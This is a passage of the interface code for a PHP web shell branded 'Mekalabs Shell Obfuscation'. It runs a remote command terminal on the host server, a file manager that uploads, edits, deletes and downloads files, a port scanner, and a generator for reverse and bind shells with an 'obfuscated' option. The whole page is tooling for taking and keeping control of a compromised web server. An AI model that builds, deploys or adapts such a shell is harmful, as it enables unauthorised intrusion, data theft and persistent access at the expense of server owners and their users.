        .header h1 { margin: 0; color: #00aaff; font-size: 14px; font-weight: normal; }
        .header-info { margin-top: 5px; color: #888; font-size: 11px; }
        .nav { padding: 8px 15px; background: #151515; display: flex; gap: 8px; flex-wrap: wrap; border-bottom: 1px solid #222; width: 100%; }
        .nav a { padding: 6px 12px; background: #222; color: #00ff66; text-decoration: none; border: 1px solid #333; border-radius: 3px; font-size: 11px; white-space: nowrap; }
        .nav a:hover, .nav a.active { background: #2a2a2a; border-color: #0a0; }
        .container { padding: 30; margin: 2; width: 100%; }
        .tab-content { display: none; width: 100%; }
        .tab-content.active { display: block; }
        .tab-area { padding: 22px 26px; background: #111; width: 100%; display:block; }
        .terminal-container { background: #111; width: 100%; max-width: 100%; }
        #terminal-output { background: #000; color: #00ff66; padding: 12px; border-radius: 3px; height: 450px; overflow-y: auto; font-family: 'Monaco', 'Consolas', monospace; font-size: 12px; line-height: 1.3; white-space: pre-wrap; word-break: break-all; border: 1px solid #333; width: 100%; max-width: 100%; box-sizing: border-box; }
        #cmd-input { background: #000; color: #00ff66; border: 1px solid #444; padding: 10px; font-family: 'Monaco', 'Consolas', monospace; font-size: 12px; width: 100%; max-width: 100%; box-sizing: border-box; }
        .file-manager-container { width: 100%; max-width: 100%; overflow-x: hidden; }
        .breadcrumb { background: #151515; padding: 8px 10px; margin-bottom: 10px; border-radius: 3px; display: flex; flex-wrap: wrap; gap: 5px; font-size: 11px; width: 100%; box-sizing: border-box; }
        .file-list { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
        .file-list-header { display: grid; grid-template-columns: 40% 15% 20% 15% 10%; padding: 6px 8px; background: #151515; border-bottom: 1px solid #333; font-weight: bold; color: #00aaff; gap: 5px; }
        .file-item { display: grid; grid-template-columns: 40% 15% 20% 15% 10%; padding: 5px 8px; border-bottom: 1px solid #222; gap: 5px; align-items: center; font-size: 11px; transition: background 0.2s; }
        .file-item:hover { background: #1a1a1a; }
        .file-icon { margin-right: 6px; font-size: 11px; }
        .file-name { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .file-actions { display: flex; gap: 5px; flex-wrap: nowrap; }
        .file-action-btn { background: #222; border: 1px solid #333; color: #0af; padding: 2px 6px; border-radius: 2px; cursor: pointer; font-size: 10px; text-decoration: none; white-space: nowrap; }
        .file-action-btn:hover { background: #333; }
        .action-bar { background: #151515; padding: 10px; border-radius: 3px; margin-bottom: 10px; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .action-btn { background: #006600; color: white; border: 1px solid #00aa00; padding: 8px 12px; border-radius: 3px; cursor: pointer; font-size: 11px; }
        .action-btn:hover { background: #008800; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; align-items: center; justify-content: center; }
        .modal-content { background: #111; padding: 20px; border-radius: 5px; border: 1px solid #333; width: 90%; max-width: 800px; max-height: 90vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid #333; }
        .modal-close { background: #660000; color: white; border: none; padding: 5px 10px; cursor: pointer; border-radius: 3px; }
        .modal-close:hover { background: #880000; }
        #file-editor { width: 100%; height: 400px; background: #000; color: #00ff66; border: 1px solid #333; font-family: monospace; padding: 10px; font-size: 12px; resize: vertical; box-sizing: border-box; }
        .quick-commands { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
        .quick-commands button { background: #222; border: 1px solid #444; font-size: 11px; padding: 6px 10px; color: #00ff66; cursor: pointer; border-radius: 3px; }
        .quick-commands button:hover { background: #333; }
        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 12px; margin-bottom: 15px; width: 100%; }
        .dashboard-card { background: #151515; padding: 4px 8px; border-radius: 8px; border: 1px solid #222; font-size: 11px; }
        .dashboard-card h3 { color: #00aaff; margin: 0 0 6px 0; border-bottom: 1px solid #333; padding-bottom: 5px; font-size: 12px; }
        .system-info { width: 100%; }
        .info-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222; font-size: 11px; }
        .info-label { color: #00aaff; font-weight: bold; min-width: 150px; }
        .info-value { color: #ccc; word-break: break-all; text-align: right; flex: 1; margin-left: 10px; }
        .message { padding: 8px 12px; margin: 8px 0; border-radius: 3px; font-size: 11px; }
        .message.success { background: #006600; color: #fff; }
        .message.error { background: #660000; color: #fff; }
        input, textarea, select { background: #000; color: #00ff66; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 11px; width: 100%; box-sizing: border-box; }
        button { padding: 8px 12px; background: #006600; color: #fff; border: 1px solid #00aa00; cursor: pointer; font-family: monospace; font-size: 11px; border-radius: 3px; }
        button:hover { background: #008800; }
        h2 { color: #00aaff; margin: 0 0 12px 0; font-size: 14px; font-weight: normal; padding-bottom: 6px; border-bottom: 1px solid #333; }
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #444; }

        /* NETWORK TOOLS STYLES */
        .network-form { background: #151515; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #333; }
        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
        .form-row .form-group { flex: 1; }
        .form-label { display: block; margin-bottom: 5px; color: #00aaff; font-size: 11px; }
        .instructions-box { background: #151515; padding: 12px; border-radius: 3px; margin-top: 15px; border-left: 4px solid #00aaff; }
        .instructions-box h4 { color: #00aaff; margin: 0 0 10px 0; font-size: 12px; }
        .port-status { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
        .port-open { background: #006600; color: #00ff66; }
        .port-closed { background: #660000; color: #f55; }
        .loading { text-align: center; color: #0af; padding: 20px; font-size: 12px; }
        .results-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        .results-table th { background: #151515; padding: 8px; text-align: left; color: #00aaff; font-size: 11px; }
        .results-table td { padding: 6px 8px; border-bottom: 1px solid #222; font-size: 11px; }
        .results-table tr:hover { background: #1a1a1a; }

        /* Header Styles */
        .meka-header {
            width: 100%;
            background: radial-gradient(circle at top left);
            border-bottom: 1px solid rgba(255,255,255,0.03);
            padding: 18px 0;
        }
        .meka-wrapper {
            width: 80vw;
            max-width: 1400px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 18px;
        }
        .meka-brand .title {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 800;
            font-size: 30px;
            line-height: 1;
            margin: 0;
            background: linear-gradient(90deg, #c37bff, #9e5df7, #7d37ff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 6px rgba(195,123,255,0.30), 0 0 14px rgba(156,93,247,0.18);
        }
        .meka-brand .subtitle {
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
            letter-spacing: 1.4px;
            text-transform: lowercase;
            color: rgba(255,255,255,0.75);
            font-weight: 600;
        }
        .meka-info {
            display:flex;
            gap:12px;
            align-items:center;
            font-family: 'JetBrains Mono', monospace;
            font-size:12px;
            color: rgba(255,255,255,0.72);
            white-space:nowrap;
        }
        .logout-btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 12px;
            background: #7a0000;
            border: 1px solid #aa0000;
            border-radius: 4px;
            color: #fff;
            font-size: 11px;
            text-decoration: none;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s ease-in-out;
        }
        .logout-btn:hover {
            background: #b30000;
            border-color: #ff4444;
            transform: scale(1.05);
        }
        .meka-nav {
            width: 80vw;
            max-width: 1400px;
            margin: 10px auto 0 auto;
            display:flex;
            gap:8px;
            padding:8px 0;
            align-items:center;
            justify-content:flex-start;
        }
        .meka-nav a {
            padding:6px 12px;
            background:#111;
            color:#00ff66;
            text-decoration:none;
            border:1px solid rgba(255,255,255,0.03);
            border-radius:4px;
            font-size:12px;
            font-family: 'Consolas','Courier New', monospace;
            white-space:nowrap;
        }
        .meka-nav a:hover,
        .meka-nav a.active {
            background:#1f1f2a;
            border-color: rgba(160,220,255,0.06);
            color:#e8f7ff;
        }
        .meka-content {
            width: 80vw;
            max-width: 1400px;
            margin: 20px auto;
            padding: 0;
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 8px;
            background: rgba(0,0,0,0.18);
            box-shadow: 0 0 18px rgba(0,0,0,0.35);
        }
    </style>
</head>
<body>
    <header class="meka-header" role="banner">
        <div class="meka-wrapper">
            <div class="meka-brand">
                <h1 class="title">Mekalabs</h1>
                <div class="subtitle">Shell Obfuscation</div>
            </div>
            <div class="meka-info" aria-hidden="false">
                <strong style="opacity:0.9;">User:</strong>
                <span id="current-user"><?php echo htmlspecialchars(getCurrentUser()); ?></span>
                <span style="opacity:0.45;">|</span>
                <strong style="opacity:0.9;">Directory:</strong>
                <span id="current-dir"><?php echo htmlspecialchars($_SESSION['current_dir']); ?></span>
                <a class="logout-btn" href="?logout=1">Logout</a>
            </div>
        </div>
    </header>

    <div class="meka-nav">
        <a href="#" onclick="switchTab('dashboard')" class="<?php echo $active_tab === 'dashboard' ? 'active' : ''; ?>">📊 Dashboard</a>
        <a href="#" onclick="switchTab('terminal')" class="<?php echo $active_tab === 'terminal' ? 'active' : ''; ?>">💻 Terminal</a>
        <a href="#" onclick="switchTab('files')" class="<?php echo $active_tab === 'files' ? 'active' : ''; ?>">📁 File Manager</a>
        <a href="#" onclick="switchTab('network')" class="<?php echo $active_tab === 'network' ? 'active' : ''; ?>">🌐 Network</a>
        <a href="#" onclick="switchTab('system')" class="<?php echo $active_tab === 'system' ? 'active' : ''; ?>">🖥️ System Info</a>
    </div>

    <div class="meka-content">
        <!-- DASHBOARD TAB -->
        <div id="dashboard-tab" class="tab-content <?php echo $active_tab === 'dashboard' ? 'active' : ''; ?>">
            <div class="tab-area">
                <h2>📊 Dashboard</h2>
                <div class="dashboard-grid">
                    <div class="dashboard-card">
                        <h3>💻 System Info</h3>
                        <p><strong>OS:</strong> <?php echo php_uname('s'); ?></p>
                        <p><strong>Hostname:</strong> <?php echo php_uname('n'); ?></p>
                        <p><strong>Release:</strong> <?php echo php_uname('r'); ?></p>
                    </div>
                    <div class="dashboard-card">
                        <h3>🐘 PHP Info</h3>
                        <p><strong>Version:</strong> <?php echo PHP_VERSION; ?></p>
                        <p><strong>Memory Limit:</strong> <?php echo ini_get('memory_limit'); ?></p>
                        <p><strong>Max Upload:</strong> <?php echo ini_get('upload_max_filesize'); ?></p>
                    </div>
                    <div class="dashboard-card">
                        <h3>👤 User & Directory</h3>
                        <p><strong>User:</strong> <?php echo htmlspecialchars(getCurrentUser()); ?></p>
                        <p><strong>Current Directory:</strong> <code><?php echo $_SESSION['current_dir']; ?></code></p>
                        <p><strong>Home Directory:</strong> <?php echo getHomeDirectory(); ?></p>
                    </div>
                    <div class="dashboard-card">
                        <h3>🌐 Server Info</h3>
                        <p><strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR'] ?? 'N/A'; ?></p>
                        <p><strong>Client IP:</strong> <?php echo $_SERVER['REMOTE_ADDR'] ?? 'N/A'; ?></p>
                        <p><strong>Document Root:</strong> <?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'N/A'; ?></p>
                    </div>
                </div>
                <div class="quick-commands">
                    <button onclick="sendTerminalCommand('whoami')">whoami</button>
                    <button onclick="sendTerminalCommand('pwd')">pwd</button>
                    <button onclick="sendTerminalCommand('ls -la')">ls -la</button>
                    <button onclick="sendTerminalCommand('cd ..')">cd ..</button>
                    <button onclick="sendTerminalCommand('uname -a')">System Info</button>
                    <button onclick="sendTerminalCommand('df -h')">Disk Space</button>
                    <button onclick="sendTerminalCommand('free -m')">Memory</button>
                </div>
            </div>
        </div>

        <!-- TERMINAL TAB -->
        <div id="terminal-tab" class="tab-content <?php echo $active_tab === 'terminal' ? 'active' : ''; ?>">
            <div class="tab-area terminal-container">
                <h2>💻 Interactive Terminal</h2>
                <div id="terminal-output">
                    <div class="terminal-line">
                        <span class="terminal-prompt"><?php echo getPrompt($_SESSION['current_dir']); ?></span>
                        <span class="terminal-output">System Console - Type commands below</span>
                    </div>
                </div>
                <div style="display: flex; gap: 8px; margin-top: 10px;">
                    <input type="text" id="cmd-input" placeholder="Type command..." style="flex: 1;" autocomplete="off" onkeydown="handleKeyDown(event)">
                    <button onclick="executeCommand()">Execute</button>
                    <button onclick="clearTerminal()">Clear</button>
                </div>
                <div class="quick-commands">
                    <button onclick="sendCommand('pwd')">pwd</button>
                    <button onclick="sendCommand('ls -la')">ls -la</button>
                    <button onclick="sendCommand('cd ..')">cd ..</button>
                    <button onclick="sendCommand('cd ~')">cd ~</button>
                    <button onclick="sendCommand('whoami')">whoami</button>
                    <button onclick="sendCommand('uname -a')">uname -a</button>
                    <button onclick="sendCommand('ps aux | head -20')">Processes</button>
                    <button onclick="sendCommand('df -h')">Disk Usage</button>
                </div>
            </div>
        </div>

        <!-- FILE MANAGER TAB -->
        <div id="files-tab" class="tab-content <?php echo $active_tab === 'files' ? 'active' : ''; ?>">
            <div class="tab-area file-manager-container">
                <h2>📁 File Manager</h2>
                <?php if (!empty($upload_message)): ?>
                    <div class="message <?php echo strpos($upload_message, '✅') !== false ? 'success' : 'error'; ?>">
                        <?php echo $upload_message; ?>
                    </div>
                <?php endif; ?>
                <div class="action-bar">
                    <form method="post" enctype="multipart/form-data" style="display: flex; gap: 8px; align-items: center;">
                        <input type="file" name="upload_file" id="file-upload" style="width: auto;">
                        <button type="submit">📤 Upload</button>
                    </form>
                    <button onclick="showCreateFileModal()" class="action-btn">📝 New File</button>
                    <button onclick="showCreateDirModal()" class="action-btn">📁 New Folder</button>
                </div>
                <div class="breadcrumb">
                    <a href="?tab=files&path=/" title="Go to root">🏠 Root</a>
                    <?php foreach ($breadcrumb as $item): ?>
                        <span>/</span>
                        <a href="?tab=files&path=<?php echo urlencode($item['path']); ?>" title="Go to <?php echo htmlspecialchars($item['path']); ?>">
                            <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                    <?php endforeach; ?>
                </div>
                <div class="file-list-header">
                    <div>Name</div>
                    <div>Size</div>
                    <div>Modified</div>
                    <div>Permissions</div>
                    <div>Actions</div>
                </div>
                <?php if ($current_path !== '/'): ?>
                    <div class="file-item" style="background: #1a1a1a;">
                        <div class="file-name">
                            <span class="file-icon">📁</span>
                            <a href="?tab=files&path=<?php echo urlencode(dirname($current_path)); ?>" style="color: #00aaff; text-decoration: none;">.. (Parent Directory)</a>
                        </div>
                        <div>-</div>
                        <div>-</div>
                        <div>DIR</div>
                        <div class="file-actions"></div>
                    </div>
                <?php endif; ?>
                <?php if (empty($files)): ?>
                    <div style="padding: 30px; text-align: center; color: #888; background: #222; border-radius: 3px; font-size: 11px;">📂 No files in this directory</div>
                <?php else: ?>
                    <?php foreach ($files as $file): ?>
                        <div class="file-item" id="file-<?php echo md5($file['path']); ?>">
                            <div class="file-name">
                                <span class="file-icon"><?php echo $file['type'] === 'directory' ? '📁' : '📄'; ?></span>
                                <?php if ($file['type'] === 'directory'): ?>
                                    <a href="?tab=files&path=<?php echo urlencode($file['path']); ?>" style="color: #00aaff; text-decoration: none;"><?php echo htmlspecialchars($file['name']); ?>/</a>
                                <?php else: ?>
                                    <span><?php echo htmlspecialchars($file['name']); ?></span>
                                <?php endif; ?>
                            </div>
                            <div><?php echo $file['size']; ?></div>
                            <div><?php echo $file['modified']; ?></div>
                            <div><?php echo $file['permissions']; ?></div>
                            <div class="file-actions">
                                <?php if ($file['type'] === 'file'): ?>
                                    <a href="?tab=files&path=<?php echo urlencode($current_path); ?>&download=<?php echo urlencode($file['path']); ?>" class="file-action-btn" title="Download">📥</a>
                                    <a href="#" onclick="editFile('<?php echo addslashes($file['path']); ?>', '<?php echo addslashes($file['name']); ?>')" class="file-action-btn" title="Edit">✏️</a>
                                    <a href="#" onclick="deleteFile('<?php echo addslashes($file['path']); ?>', '<?php echo addslashes($file['name']); ?>')" class="file-action-btn" title="Delete" style="color: #f55;">🗑️</a>
                                <?php else: ?>
                                    <a href="#" onclick="deleteDirectory('<?php echo addslashes($file['path']); ?>', '<?php echo addslashes($file['name']); ?>')" class="file-action-btn" title="Delete" style="color: #f55;">🗑️</a>
                                <?php endif; ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>

        <!-- NETWORK TAB -->
        <div id="network-tab" class="tab-content <?php echo $active_tab === 'network' ? 'active' : ''; ?>">
            <div class="tab-area">
                <h2>🌐 Network Tools</h2>
                <div class="network-form">
                    <h3 style="color:#00aaff; font-size:13px;">🔍 Port Scanner</h3>
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Target:</label>
                            <input type="text" id="scan-target" value="127.0.0.1" placeholder="IP or hostname">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Ports:</label>
                            <input type="text" id="scan-ports" value="21,22,80,443,3306,3389">
                        </div>
                    </div>
                    <button onclick="startPortScan()" style="width:100%;">🚀 Start Scan</button>
                </div>
                <div id="scan-results" style="display:none;margin-top:20px;"></div>
                <div class="network-form" style="margin-top:30px;">
                    <h3 style="color:#00aaff; font-size:13px;">🐚 Shell Generator</h3>
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Mode:</label>
                            <select id="shell-mode" onchange="toggleShellMode()">
                                <option value="reverse">Reverse Shell (Target → You)</option>
                                <option value="bind">Bind Shell (You → Target)</option>
                            </select>
                        </div>
                        <div class="form-group" id="ip-group">
                            <label class="form-label">Your IP:</label>
                            <input type="text" id="shell-ip" value="<?php echo $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'; ?>">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Port:</label>
                            <input type="number" id="shell-port" value="4444" min="1" max="65535">
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Type:</label>
                            <select id="shell-type">
                                <option value="basic">Basic</option>
                                <option value="obfuscated">Obfuscated</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Filename:</label>
                            <input type="text" id="shell-filename" value="shell.php">
                        </div>
                    </div>
                    <button onclick="generateShell()" style="width:100%;">⚡ Generate Shell</button>
                </div>
                <div id="instructions-box" class="instructions-box" style="display:none;">
                    <h4 style="color:#00aaff;">📋 Usage Instructions:</h4>
                    <div id="instructions-content"></div>
                </div>
                <div id="loading" style="display:none;text-align:center;color:#0af;padding:20px;">⏳ Processing...</div>
            </div>
        </div>

        <!-- SYSTEM INFO TAB -->
        <div id="system-tab" class="tab-content <?php echo $active_tab === 'system' ? 'active' : ''; ?>">
            <div class="tab-area">
                <h2>🖥️ System Information</h2>
                <div class="system-info">
                    <?php
                    $system_info = [
                        'PHP Version' => PHP_VERSION,
                        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
                        'Operating System' => php_uname(),
                        'System User' => getCurrentUser(),
                        'Current Directory' => $_SESSION['current_dir'],
                        'Client IP' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
                        'Server IP' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
                        'Document Root' => $_SERVER['DOCUMENT_ROOT'] ?? 'N/A',
                        'PHP Memory Limit' => ini_get('memory_limit'),
                        'Max Upload Size' => ini_get('upload_max_filesize'),
                        'Max Post Size' => ini_get('post_max_size'),
                        'Server Time' => date('Y-m-d H:i:s')
                    ];
                    foreach ($system_info as $key => $value): ?>
                        <div class="info-item">
                            <div class="info-label"><?php echo $key; ?></div>
                            <div class="info-value"><?php echo htmlspecialchars($value); ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>
                <div class="quick-commands">
                    <button onclick="sendTerminalCommand('uname -a')">System Info</button>
                    <button onclick="sendTerminalCommand('uptime')">Uptime</button>
                    <button onclick="sendTerminalCommand('df -h')">Disk Usage</button>
                    <button onclick="sendTerminalCommand('free -m')">Memory</button>
                    <button onclick="sendTerminalCommand('ps aux | head -20')">Processes</button>
                    <button onclick="sendTerminalCommand('netstat -tulpn')">Network</button>
                </div>
            </div>
        </div>
    </div>

    <!-- MODALS -->
    <div id="file-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 style="margin: 0; font-size: 14px;" id="modal-title">Edit File</h3>
                <button class="modal-close" onclick="closeModal()">Close</button>
            </div>
            <form id="file-form" onsubmit="saveFile(event)">
                <input type="hidden" id="file-path" name="filepath">
                <div style="margin-bottom: 10px;">
                    <label style="display: block; margin-bottom: 5px; color: #00aaff;">Filename:</label>
                    <input type="text" id="filename" name="filename" required style="width: 100%;">
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; color: #00aaff;">Content:</label>
                    <textarea id="file-editor" name="content" spellcheck="false"></textarea>
                </div>
                <div style="display: flex; gap: 10px; justify-content: flex-end;">
                    <button type="button" onclick="closeModal()">Cancel</button>
                    <button type="submit" id="save-btn">Save</button>
                </div>
            </form>
        </div>
    </div>

    <div id="create-dir-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 style="margin: 0; font-size: 14px;">Create New Folder</h3>
                <button class="modal-close" onclick="closeCreateDirModal()">Close</button>
            </div>
            <form id="dir-form" onsubmit="createDirectory(event)">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px; color: #00aaff;">Folder Name:</label>
                    <input type="text" id="dirname" name="dirname" required style="width: 100%;" placeholder="Enter folder name">
                </div>
                <div style="display: flex; gap: 10px; justify-content: flex-end;">
                    <button type="button" onclick="closeCreateDirModal()">Cancel</button>
                    <button type="submit">Create</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Terminal JavaScript
        let commandHistory = <?php echo json_encode(array_column($_SESSION['terminal_history'], 'command')); ?>;
        let historyIndex = -1;
        let currentPrompt = "<?php echo addslashes(getPrompt($_SESSION['current_dir'])); ?>";

        // Tab Switching
        function switchTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
            document.querySelectorAll('.nav a').forEach(link => link.classList.remove('active'));
            document.getElementById(tabName + '-tab').classList.add('active');
            event.target.classList.add('active');
            if (tabName === 'terminal') setTimeout(() => document.getElementById('cmd-input').focus(), 100);
            return false;
        }

        function addTerminalLine(content, type = 'output', showPrompt = false) {
            const terminal = document.getElementById('terminal-output');
            const line = document.createElement('div');
            line.className = 'terminal-line';
            if (type === 'command') {
                line.innerHTML = `<span class="terminal-prompt">${currentPrompt}</span> <span class="terminal-command">${escapeHtml(content)}</span>`;
            } else if (type === 'error') {
                line.innerHTML = `<span class="terminal-error">${escapeHtml(content)}</span>`;
            } else {
                if (showPrompt) {
                    line.innerHTML = `<span class="terminal-prompt">${currentPrompt}</span> <span class="terminal-output">${escapeHtml(content)}</span>`;
                } else {
                    line.innerHTML = `<span class="terminal-output">${escapeHtml(content)}</span>`;
                }
            }
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function updateTerminalInfo(user, dir, prompt) {
            document.getElementById('current-user').textContent = user;
            document.getElementById('current-dir').textContent = dir;
            currentPrompt = prompt;
        }

        function executeCommand() {
            const input = document.getElementById('cmd-input');
            const command = input.value.trim();
            if (!command) return;
            if (commandHistory[commandHistory.length - 1] !== command) commandHistory.push(command);
            historyIndex = commandHistory.length;
            addTerminalLine(command, 'command');
            input.value = '';
            fetch('?ajax=execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'command=' + encodeURIComponent(command)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (data.output.trim() !== '') addTerminalLine(data.output);
                    updateTerminalInfo(data.user, data.directory, data.prompt);
                    addTerminalLine('', 'output', true);
                } else {
                    addTerminalLine('Error executing command', 'error');
                    addTerminalLine('', 'output', true);
                }
            })
            .catch(error => {
                addTerminalLine('Connection error: ' + error.message, 'error');
                addTerminalLine('', 'output', true);
            });
        }

        function sendCommand(cmd) {
            document.getElementById('cmd-input').value = cmd;
            executeCommand();
        }

        function sendTerminalCommand(cmd) {
            switchTab('terminal');
            setTimeout(() => {
                document.getElementById('cmd-input').value = cmd;
                document.getElementById('cmd-input').focus();
                setTimeout(() => executeCommand(), 100);
            }, 100);
        }

        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = '';
            addTerminalLine('Terminal cleared', 'output');
            addTerminalLine('', 'output', true);
        }

        function handleKeyDown(event) {
            const input = document.getElementById('cmd-input');
            if (event.key === 'Enter') {
                executeCommand();
                event.preventDefault();
                return;
            }
            if (event.key === 'ArrowUp') {
                if (commandHistory.length > 0) {
                    if (historyIndex <= 0) historyIndex = commandHistory.length;
                    historyIndex--;
                    if (historyIndex >= 0) input.value = commandHistory[historyIndex];
                }
                event.preventDefault();
                return;
            }
            if (event.key === 'ArrowDown') {
                if (commandHistory.length > 0) {
                    historyIndex++;
                    if (historyIndex >= commandHistory.length) {
                        historyIndex = commandHistory.length;
                        input.value = '';
                    } else {
                        input.value = commandHistory[historyIndex];
                    }
                }
                event.preventDefault();
                return;
            }
        }

        // File Manager Functions
        function showCreateFileModal() {
            document.getElementById('modal-title').textContent = 'Create New File';
            document.getElementById('file-path').value = '';
            document.getElementById('filename').value = '';
            document.getElementById('file-editor').value = '';
            document.getElementById('save-btn').textContent = 'Create';
            document.getElementById('file-modal').style.display = 'flex';
            document.getElementById('filename').focus();
        }

        function editFile(filepath, filename) {
            fetch('?action=get_file_content&file=' + encodeURIComponent(filepath))
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('modal-title').textContent = 'Edit File: ' + filename;
                        document.getElementById('file-path').value = filepath;
                        document.getElementById('filename').value = filename;
                        document.getElementById('file-editor').value = data.content;
                        document.getElementById('save-btn').textContent = 'Save';
                        document.getElementById('file-modal').style.display = 'flex';
                        document.getElementById('file-editor').focus();
                    } else {
                        alert('Error: ' + data.message);
                    }
                })
                .catch(error => alert('Error loading file: ' + error.message));
        }

        function closeModal() {
            document.getElementById('file-modal').style.display = 'none';
        }

        function saveFile(event) {
            event.preventDefault();
            const formData = new FormData(document.getElementById('file-form'));
            const filepath = document.getElementById('file-path').value;
            const isEdit = filepath !== '';
            const action = isEdit ? 'edit_file' : 'create_file';
            fetch('?action=' + action, {method: 'POST', body: new URLSearchParams(formData)})
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert(data.message);
                        closeModal();
                        location.reload();
                    } else {
                        alert('Error: ' + data.message);
                    }
                })
                .catch(error => alert('Error: ' + error.message));
        }

        function deleteFile(filepath, filename) {
            if (confirm('Are you sure you want to delete "' + filename + '"?')) {
                fetch('?action=delete_file&file=' + encodeURIComponent(filepath))
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert(data.message);
                            location.reload();
                        } else {
                            alert('Error: ' + data.message);
                        }
                    })
                    .catch(error => alert('Error: ' + error.message));
            }
        }

        function showCreateDirModal() {
            document.getElementById('create-dir-modal').style.display = 'flex';
            document.getElementById('dirname').focus();
        }

        function closeCreateDirModal() {
            document.getElementById('create-dir-modal').style.display = 'none';
        }

        function createDirectory(event) {
            event.preventDefault();
            const formData = new FormData(document.getElementById('dir-form'));
            fetch('?action=create_dir', {method: 'POST', body: new URLSearchParams(formData)})
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert(data.message);
                        closeCreateDirModal();
                        location.reload();
                    } else {
                        alert('Error: ' + data.message);
                    }
                })
                .catch(error => alert('Error: ' + error.message));
        }

        function deleteDirectory(dirpath, dirname) {
            if (confirm('Are you sure you want to delete the folder "' + dirname + '"? This will only work if the folder is empty.')) {
                fetch('?action=delete_dir&dir=' + encodeURIComponent(dirpath))
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert(data.message);
                            location.reload();
                        } else {
                            alert('Error: ' + data.message);
                        }
                    })
                    .catch(error => alert('Error: ' + error.message));
            }
        }

        // Network Functions
        function toggleShellMode() {
            const mode = document.getElementById('shell-mode').value;
            document.getElementById('ip-group').style.display = mode === 'reverse' ? 'block' : 'none';
        }

        function startPortScan() {
            const target = document.getElementById('scan-target').value.trim();
            const ports = document.getElementById('scan-ports').value.trim();
            if (!target || !ports) {
                alert('Please enter target and ports');
                return;
            }
            document.getElementById('loading').style.display = 'block';
            document.getElementById('scan-results').style.display = 'none';
            const formData = new FormData();
            formData.append('target', target);
            formData.append('ports', ports);
            fetch('?action=network_scan', {method: 'POST', body: formData})
                .then(r => r.json())
                .then(data => {
                    document.getElementById('loading').style.display = 'none';
                    let html = '<h3 style="color:#00aaff;">📊 Scan Results</h3>';
                    if (data.success) {
                        html += '<p><strong>Target:</strong> ' + data.target + ' | <strong>Scanned:</strong> ' + data.total_scanned + ' | <strong>Open:</strong> ' + data.open_ports.length + '</p>';
                        if (data.open_ports.length) {
                            html += '<h4 style="color:#00ff66;margin:15px 0 10px 0;">✅ Open Ports:</h4>';
                            html += '<table class="results-table"><tr><th>Port</th><th>Service</th><th>Status</th></tr>';
                            data.open_ports.forEach(p => {
                                html += '<tr><td><strong>' + p.port + '</strong></td><td style="color:#0af">' + p.service + '</td><td><span class="port-status port-open">' + p.status + '</span></td></tr>';
                            });
                            html += '</table>';
                        } else {
                            html += '<p style="color:#888;">No open ports found.</p>';
                        }
                    } else {
                        html += '<p style="color:#f55;">❌ Error: ' + data.message + '</p>';
                    }
                    document.getElementById('scan-results').innerHTML = html;
                    document.getElementById('scan-results').style.display = 'block';
                })
                .catch(error => {
                    document.getElementById('loading').style.display = 'none';
                    alert('Error: ' + error.message);
                });
        }

